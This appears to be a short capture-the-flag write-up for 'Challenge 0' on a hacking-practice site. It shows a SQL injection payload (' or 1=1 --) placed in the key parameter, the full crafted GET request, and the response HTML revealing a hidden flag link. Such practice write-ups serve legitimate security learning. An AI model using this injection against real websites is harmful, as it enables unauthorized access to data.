# Challenge 0
  - https://canyouhack.us/c/4e938b718a1501e5ae5471f1534376dc

Modify `key=` parameter in GET request as SQL statement `' or 1=1 --` to solve challenge, which adds ` <li><a href="/h4ckm3">14892b6aa415e8a154424f8c1a3a9aa3</a></li>` to the page and redirects you to your dashboard with this one as solved.

### GetRequest
```
GET /c/ab100e6c0add7bedfd82ad6e2a2c6ad5?key='%20or%201%3d1-- HTTP/1.1
Host: canyouhack.us
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://canyouhack.us/c/ab100e6c0add7bedfd82ad6e2a2c6ad5?key=2780d36d4e0e17581ac5ddbb0036ef39
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8
Cookie: progress="Qs9ZRUiDIce/2L1kqNpgGIcNboYHi0YdIeY5Kty+YVxoouRPusJ17lF5YoliFVUDm4R1jeYDHmshiLHwhNfGLgRZmTOZD3Rr25PwRJqAUFk="
```

### HTML of response page
```html
<h1>Challenge 0</h1>

<h2>Farm Lookup</h2>
<form method="get" action="/c/ab100e6c0add7bedfd82ad6e2a2c6ad5">
 <p>
     <input name="key" type="hidden" value="&#39; or 1=1--"></input>
     <input type="submit" value="Get Pages">
 </p>
</form>

<h3>Pages</h3>
    <ul>

       <li>goats</li>

       <li>chicken</li>

       <li>dogs</li>

       <li>cows</li>

       <li><a href="/h4ckm3">14892b6aa415e8a154424f8c1a3a9aa3</a></li>

   </ul>

</div>
```
